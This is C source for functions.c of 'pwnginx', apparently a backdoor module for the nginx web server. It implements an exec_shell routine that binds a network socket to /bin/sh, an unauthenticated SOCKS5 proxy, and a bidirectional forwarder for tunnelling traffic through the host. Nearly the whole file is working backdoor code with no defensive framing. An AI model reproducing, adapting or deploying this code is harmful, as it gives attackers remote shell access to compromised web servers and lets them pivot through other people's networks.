/*                                 
 *  functions.c - pwnginx functions
 *  t57root@gmail.com              
 *  lastest version @ https://github.com/t57root/pwnginx
 *  openwill.me / www.hackshell.net
 */                           

#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

#include "socks5.h"

//int shell_count=0;
int rootpipe1[2];
int rootpipe2[2];

int mrecv(int fd, void *buffer, int length)
{
    char *ptr; 
    ptr=(char *)buffer; 
    int recv_bytes;
    while(1){
        recv_bytes=recv(fd, ptr, length,0); 
        if(recv_bytes<=0) { 
            if(errno==EINTR){
                continue;
            }
            else if(errno==EAGAIN) {
                sleep(1);
                continue;
            }
            else {
                return(-1);
            }
        }
        else break;
    }
    return recv_bytes; 
}

int msend(int fd, void *buffer, int length)
{
    int bytes_left; 
    int written_bytes; 
    char *ptr; 
    ptr=(char *)buffer; 
    bytes_left=length; 
    while(bytes_left>0) { 
        written_bytes=write(fd, ptr, bytes_left); 
        if(written_bytes<=0){ 
            if(errno==EINTR){
                continue;
            }
            else if(errno==EAGAIN){
                sleep(1);
                continue;
            }
            else {
                return(-1);
            }
        }
        bytes_left-=written_bytes; 
        ptr+=written_bytes;
    } 
    return length; 
}

int exec_shell(int fd)
{
    int pid;
    pid = fork();
    if(pid>0){
        close(fd);
        exit(0);
    }

    dup2(fd,0);         
    dup2(fd,1);
    dup2(fd,2);
    execl("/bin/sh","-sh",(char *)0);
    return 0;
}

int forwarder(int from,int to)
{
    int rec,sen;
    fd_set rfds;
    char buffer[BUFSIZ+1];
    while(1){
        FD_ZERO(&rfds);
        FD_SET(from, &rfds);
        FD_SET(to, &rfds);
        int bigger = (from>to?from:to)+1;
        if(select(bigger, &rfds, NULL, NULL, NULL)==0)
            continue;
        if(FD_ISSET(from,&rfds)){
            if ((rec = recv(from, buffer, BUFSIZ,0)) > 0){
                sen=msend(to, &buffer, rec);
                //printf("%d => %d\n",rec,sen);
                if(sen<=0) break;
            }
            else break;
        }
        if(FD_ISSET(to,&rfds)){
            if ((rec = recv(to, buffer, BUFSIZ,0)) > 0){ 
                sen=msend(from, &buffer, rec);
                //printf("%d <= %d\n",rec,sen);
                if(sen<=0) break;
            }
            else break;
        }
    }
    return 0;
}


int worker(int csock)
{
    char buffer[BUFSIZ+1];
    bzero(&buffer, sizeof buffer);
    int rec,sen;
    /*****Select******/
    printf("Recving select message...\n");
    if((rec = mrecv(csock, buffer, sizeof(SELECT)))<=0){
        close(csock);
        return -1;
    }
    printf("Recved.\n");
    pSELECT select = (pSELECT)&buffer;
    //Do something like checking if the version is 5
    pSELECT_RESPONSE selectRes = (pSELECT_RESPONSE)malloc(sizeof(SELECT_RESPONSE));
    selectRes->ver=0x5; //Socks Version 5
    selectRes->method=0x0;  //NO AUTHENTICATION REQUIRED
    if(select->ver!=0x5){
        selectRes->method=0xFF;
    }
    sen = msend(csock, selectRes, sizeof(SELECT_RESPONSE));
    printf("Select done,rec/send:%d/%d\n",rec,sen);
    free(selectRes);

    /*****Request******/
    printf("Recving request...\n");
    rec = recv(csock, buffer, BUFSIZ,0);
    printf("Recved %d bytes\n",rec);
    pREQUEST request = (pREQUEST)&buffer;

    //Parse the target addr
    struct sockaddr_in taddr;
    taddr.sin_family = AF_INET;
    if(request->atyp==0x3){     //Domain name
        //char domainlen=*(&request->atyp+sizeof(request->atyp));
        char domainlen=*(&request->addr);
        char domain[256]={0};
        strncpy(domain,&request->atyp+2,(unsigned int)domainlen);
        struct hostent *phost = gethostbyname(domain);
        if(phost==NULL){
            printf("Cannot Resolv the Domain name:%s\n",(char *)&domain);
            close(csock);
            return -1;
        }
        memcpy(&taddr.sin_addr,phost->h_addr_list[0],phost->h_length);
        memcpy(&taddr.sin_port,&request->atyp+sizeof(request->atyp)+1+(unsigned int)domainlen,2);
    }
    else if(request->atyp==0x1){    //IPv4 Addr
        memcpy(&taddr.sin_addr.s_addr,&request->atyp+1,4);
        memcpy(&taddr.sin_port,&request->atyp+1+4,2);
    }
    else{
        printf("Not implemented\n");
        close(csock);
        return -1;
    }
    //Connect to the target host
    pREQUEST_RESPONSE requestRes = (pREQUEST_RESPONSE)malloc(sizeof(REQUEST_RESPONSE));
    requestRes->ver=0x5;
    requestRes->rep=0x0;
    requestRes->rsv=0x0;
    requestRes->atyp=0x1;
    memset(requestRes+4, 0, 6);
    /*
    if(request->cmd=0x03){
        uint32_t tmpaddr = htonl("127.0.0.1");
        uint16_t tmpport = htons(8081);
        memcpy(requestRes+4,&tmpaddr,sizeof(uint32_t)); //XXX   wtf?
        memcpy(requestRes+8,&tmpport,sizeof(uint16_t));
    }
    */

    printf("Connecting to  port %d on %s\n",ntohs(taddr.sin_port),inet_ntoa(taddr.sin_addr));
    int tsock;
    //Check its a tcp or udp request
    if(request->cmd==0x04){ //UDP ASSOCIATE X'03' //Never use udp
        printf("Hey, its a udp request!\n");
        tsock = socket(AF_INET, SOCK_DGRAM, 0);
    }   
    else{
        tsock=socket(AF_INET, SOCK_STREAM, 0);
    }

    if(connect(tsock, (struct sockaddr *) &taddr, sizeof(taddr))==-1){
        requestRes->rep=0x5;
        sen = msend(csock, requestRes, sizeof(REQUEST_RESPONSE));
        close(csock);
        return -1;
    }
    printf("Done\n");
    sen = msend(csock, requestRes, sizeof(REQUEST_RESPONSE));
    printf("Request done,rec/send:%d/%d\n",rec,sen);
    free(requestRes);

    if(request->cmd==0x03){ //UDP ASSOCIATE
        printf("Recving... #1\n");

        rec = recv(csock, buffer, BUFSIZ,0);
        /*
            struct sockaddr_in tmpaddr;
            tmpaddr.sin_family = AF_INET;
                memcpy(&tmpaddr.sin_addr.s_addr,buffer+4,4); //XXX
        memcpy(&tmpaddr.sin_port,buffer+4+4,2);
        printf("Recv Ascii:%s:%d\n",inet_ntoa(tmpaddr.sin_addr),ntohs(tmpaddr.sin_port));
        */
        printf("Done:%d\nSending... #1\n",rec);
        sen = send(tsock, buffer, rec,0);
        printf("Done:%d\nRecving... #2\n",sen);
        rec = recv(tsock, buffer, BUFSIZ,0);
        printf("Done:%d\nSending... #2\n",rec);
        sen = send(csock, buffer, rec,0);
        printf("Done:%d",sen);
        return 0;
    }

    /*****Forward******/
    forwarder(csock,tsock);
    printf("worker exit");
    close(csock);
    close(tsock);
    return 0;
}

int exec_socks5(int fd)
{
    int pid;
    pid = fork();
    if(pid>0){
        close(fd);
        exit(0);
    }
    int flags = fcntl(fd,F_GETFL,0);
    flags &= ~O_NONBLOCK;
    fcntl(fd,F_SETFL,flags);

    worker(fd);
    exit(0);
}

